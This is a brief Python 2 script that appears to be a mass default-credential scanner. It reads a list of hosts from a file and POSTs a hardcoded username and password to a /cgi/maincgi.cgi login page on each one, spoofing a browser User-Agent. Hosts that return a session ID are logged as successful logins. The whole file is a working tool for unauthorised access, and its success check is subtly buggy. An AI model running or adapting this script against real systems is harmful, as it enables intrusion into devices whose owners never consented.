#!/usr/bin/python


import httplib
import urllib
#params = urllib.urlencode({'spam': 1, 'eggs': 2, 'bacon': })
bdata = urllib.urlencode({"username": "superman","passwd": "talent","loginSubmitIpt": "%B5%C7%C2%BC"})

def writeurl(url):
    result = file('result.txt','a')
    result.write(url + '\n')
    result.close
         
def posthttps(url):
    conn = httplib.HTTPSConnection(url)
    conn.request("POST","/cgi/maincgi.cgi?Url=Index", bdata, headers = {"User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:23.0) Gecko/20100101 Firefox/23.0",  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "en-gb,en;q=0.5","Accept-Encoding": "gzip, deflate", "Connection": "keep-alive","Content-Type": "application/x-www-form-urlencoded", "Content-Length": "59"})
    response = conn.getresponse()
    #print response.status
    resheads = response.getheaders()
    if len(resheads[1][1]) > 12 and str(resheads).find('session_id'):
        writeurl(url)
        print 'get one'
        
    #print resheads[1][1]
    #print len(resheads[1][1])
#    print response.read()
    
    
#posthttps("yhztb.cn")

def main():
#    posthttps("yhztb.cn")
    urlfile = file('url.txt')
    for line in urlfile:
        line = line.strip('\n')
        try:
            posthttps(line)
        except:
            print 'error'
            
        # if len(line) == 0: # Zero length indicates EOF
        #     break


main()



# c = httplib.HTTPSConnection("ccc.de")
# c.request("GET", "/")
# response = c.getresponse()
# print response.status, response.reason
# data = response.read()
# print data